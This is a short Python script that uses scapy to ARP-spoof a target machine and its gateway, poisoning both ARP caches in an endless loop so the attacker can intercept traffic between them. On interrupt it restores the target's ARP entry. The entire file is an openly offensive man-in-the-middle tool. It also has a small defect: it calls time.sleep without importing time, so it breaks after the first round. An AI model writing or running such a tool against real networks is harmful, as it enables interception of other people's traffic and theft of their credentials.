import scapy.all as scapy
import optparse

def get_command():
	parser = optparse.OptionParser()
	parser.add_option("-t", "--target", dest="target", help="ip of the target machine/system")
	parser.add_option("-g", "--gateway", dest="gateway", help="ip of the connect network")
	(options, arguments) = parser.parse_args()
	return options

def scan(ip):
#   creating arp request for sending/asking the networks who has the ip sent 
    arp_request = scapy.ARP(pdst=ip)

#   broadcast is required to send the ar request via mac address for the networks
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    
    broadcast_arp_request = broadcast/arp_request
    answered_list = scapy.srp(broadcast_arp_request, timeout = 1, verbose=False)[0]

#   response stored in answered in the form of lists according to documentation
    return answered_list[0][1].hwsrc

def restore(destination_ip, source_ip):
	destination_mac = scan(destination_ip)
	source_mac = scan(source_ip)
	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet, verbose=False)

def spoof(target_ip, spoof_ip):
	target_mac = scan(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,  psrc=spoof_ip)
	scapy.send(packet, verbose=False)

packet_count = 0
options = get_command()
 
try:
	while True:
		spoof(options.target, options.gateway)
		spoof(options.gateway, options.target)
		packet_count += 2
		print("\r Sent packets = " + str(packet_count), end="")
		time.sleep(2)
except KeyboardInterrupt:
	print("...........Resetting the mac address of the target")
	restore(options.target,options.gateway) 
	
	
	
	
